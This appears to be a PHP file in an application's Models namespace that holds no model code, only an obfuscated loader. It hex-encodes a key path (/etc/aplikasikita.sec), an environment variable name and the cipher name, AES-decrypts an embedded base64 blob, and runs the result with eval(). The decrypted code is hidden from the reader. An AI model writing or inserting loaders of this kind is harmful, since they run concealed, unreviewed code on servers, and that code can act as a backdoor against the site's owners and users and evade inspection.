<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('sPItT7u/UW/Tm8MawwDO/A==');

$c=base64_decode(

'51TcIJUcVgoKpUXoTK/CrDSiRidLySYU6Dbyp/S5WyJbDHgegyc4+uM+5wOBzKcpM6SUfdG15TDi' .
'qCVYZOhJAeT0+7lssRjVr/iDAugWJkRqr22XbYB+yzM/jgeCKdtd13ekPTLAyOuJdkIAYonrWP3O' .
'KEMTTbgqNdbMl+pxWMosLBG2rq8x2mxy+ax7L/aJyZ9M7wnp/jWaI/yOepY60KWfulzDZosVzSJb' .
'T9KVFmoxHFEZ0IigDqj3SKhdfTm8O00IC/KqXReUt/REZn+cwJpyo0zGGzHIOUqIgm5RjoRpVSad' .
'A7z6Intr5N8gMj39CaLifWWVYRFwWt1cYJZNy3gNXBL01T3OObggBVq+OyPlznSNy9ywO4uIUky2' .
'knuZCUDrJvOGqZcK08QlPDarKTX+UUTbZaYHubJ8leCFBx3yGFEQ6XwTD8Mcfu7T3+qoRcbchcTf' .
'hX3l2y6Yk1KXbS84rWa2uYSwnoc2y9sbg1r4c+Ue4EaZVJtPz9CUBijn7gTC4NkUjRZHCLXLC/Um' .
'xPPoL51hwNf+77Qnis3ut/bwc4qmEIoNa5RSqI7WG5DZLZswGcTS/sIXVxDs5ApPnbGC3QNdbnG3' .
'+w+3SDnhBrV0Qo/K6jTeOx8O9oi+uAw4WA3q6IyZcYWixAHvJoAhCNkJli+1EzmYBd/a0CIMieEC' .
'irBXNq5Xo6xHABXsDjiGtiL3WHuuWav9cbp1BbXZklwCIVSITytfMGBR2iZPVgwWC6p2AvSlULm1' .
'w7PnCxHcYmamervIIW2dQl0gVTkY1g=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

